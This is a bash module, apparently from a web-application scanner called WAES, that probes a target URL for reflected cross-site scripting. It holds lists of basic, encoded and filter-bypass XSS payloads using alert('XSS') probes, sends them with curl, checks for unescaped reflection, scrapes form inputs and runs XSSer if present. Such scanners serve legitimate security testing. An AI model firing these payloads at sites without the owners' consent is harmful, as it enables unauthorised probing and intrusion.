#!/usr/bin/env bash
#==============================================================================
# WAES XSS Testing Module
# Automated Cross-Site Scripting vulnerability testing
#==============================================================================

# Source color library if available
if [[ -f "${SCRIPT_DIR:-$(dirname "$0")}/lib/colors.sh" ]]; then
    # shellcheck source=lib/colors.sh
    source "${SCRIPT_DIR:-$(dirname "$0")}/lib/colors.sh"
else
    print_info() { echo "[*] $*"; }
    print_success() { echo "[+] $*"; }
    print_error() { echo "[!] $*" >&2; }
    print_warn() { echo "[~] $*"; }
fi

#==============================================================================
# XSS PAYLOAD LIBRARY
#==============================================================================

# Basic XSS payloads
declare -a XSS_BASIC=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src=javascript:alert('XSS')>"
)

# Encoded payloads
declare -a XSS_ENCODED=(
    "%3Cscript%3Ealert('XSS')%3C/script%3E"
    "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E"
    "&#60;script&#62;alert('XSS')&#60;/script&#62;"
    "\x3cscript\x3ealert('XSS')\x3c/script\x3e"
)

# Advanced/bypass payloads
declare -a XSS_ADVANCED=(
    "<ScRiPt>alert('XSS')</sCrIpT>"
    "<<SCRIPT>alert('XSS');//<</SCRIPT>"
    "<img src=\"x\" onerror=\"alert('XSS')\">"
    "<svg><script>alert('XSS')</script></svg>"
    "<body onload=alert('XSS')>"
    "<input onfocus=alert('XSS') autofocus>"
    "<marquee onstart=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# DOM-based XSS
declare -a XSS_DOM=(
    "#<script>alert('XSS')</script>"
    "?param=<script>alert('XSS')</script>"
    "javascript:void(0);alert('XSS')"
)

#==============================================================================
# XSS TESTING FUNCTIONS
#==============================================================================

# Test a single URL with XSS payloads
test_xss_url() {
    local url="$1"
    local output_file="$2"
    local payload_type="${3:-all}"
    
    local payloads=()
    
    # Select payload set
    case "$payload_type" in
        basic)
            payloads+=("${XSS_BASIC[@]}")
            ;;
        encoded)
            payloads+=("${XSS_ENCODED[@]}")
            ;;
        advanced)
            payloads+=("${XSS_ADVANCED[@]}")
            ;;
        dom)
            payloads+=("${XSS_DOM[@]}")
            ;;
        all)
            payloads+=("${XSS_BASIC[@]}" "${XSS_ENCODED[@]}" "${XSS_ADVANCED[@]}" "${XSS_DOM[@]}")
            ;;
    esac
    
    print_info "Testing ${#payloads[@]} XSS payloads against: $url"
    
    local detected=0
    
    for payload in "${payloads[@]}"; do
        # Test GET parameter injection
        local test_url="${url}${payload}"
        
        # Make request and check response
        local response
        response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)
        
        # Check if payload is reflected unescaped
        if echo "$response" | grep -qF "$payload"; then
            echo "[POTENTIAL XSS] Payload reflected: $payload" | tee -a "$output_file"
            ((detected++))
        fi
    done
    
    if [[ $detected -gt 0 ]]; then
        print_warn "Found $detected potential XSS vulnerabilities"
    else
        print_success "No obvious XSS vulnerabilities detected"
    fi
}

# Test form inputs for XSS
test_xss_forms() {
    local target_url="$1"
    local output_file="$2"
    
    print_info "Scanning for forms on: $target_url"
    
    # Download page and extract forms
    local page_content
    page_content=$(curl -s -L "$target_url" 2>/dev/null)
    
    # Extract form action URLs
    local forms
    forms=$(echo "$page_content" | grep -i '<form' | sed -n 's/.*action="\([^"]*\)".*/\1/p' | head -10)
    
    if [[ -z "$forms" ]]; then
        print_info "No forms found on page"
        return
    fi
    
    echo "Forms found:" | tee -a "$output_file"
    echo "$forms" | tee -a "$output_file"
    echo "" | tee -a "$output_file"
    
    # Extract input fields
    local inputs
    inputs=$(echo "$page_content" | grep -i '<input' | sed -n 's/.*name="\([^"]*\)".*/\1/p' | head -20)
    
    echo "Input fields found:" | tee -a "$output_file"
    echo "$inputs" | tee -a "$output_file"
    echo "" | tee -a "$output_file"
}

# Scan with XSSer if available
test_xss_automated() {
    local target_url="$1"
    local output_file="$2"
    
    if command -v xsser &>/dev/null; then
        print_info "Running automated XSS scan with XSSer..."
        {
            echo "=== XSSer Automated Scan ==="
            xsser --url="$target_url" --auto 2>/dev/null || echo "XSSer scan failed"
        } | tee -a "$output_file"
    else
        print_warn "XSSer not installed - install with: pip install xsser"
    fi
}

# Main XSS testing function
scan_xss() {
    local target_url="$1"
    local report_dir="${2:-.}"
    local payload_type="${3:-all}"
    
    local domain
    domain=$(echo "$target_url" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    local output_file="${report_dir}/${domain}_xss_scan.txt"
    
    print_info "Starting XSS scan for: $target_url"
    echo ""
    
    {
        echo "=== XSS Vulnerability Scan ==="
        echo "Target: $target_url"
        echo "Scan Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Payload Type: $payload_type"
        echo ""
    } > "$output_file"
    
    # Test various attack vectors
    test_xss_forms "$target_url" "$output_file"
    test_xss_url "$target_url?" "$output_file" "$payload_type"
    test_xss_automated "$target_url" "$output_file"
    
    print_success "XSS scan complete: $output_file"
}

# If script is run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 1 ]]; then
        cat << EOF
Usage: $0 <target_url> [report_dir] [payload_type]

Payload types: basic, encoded, advanced, dom, all (default)

Examples:
    $0 http://example.com/search
    $0 http://example.com ./reports basic
EOF
        exit 1
    fi
    
    scan_xss "$@"
fi
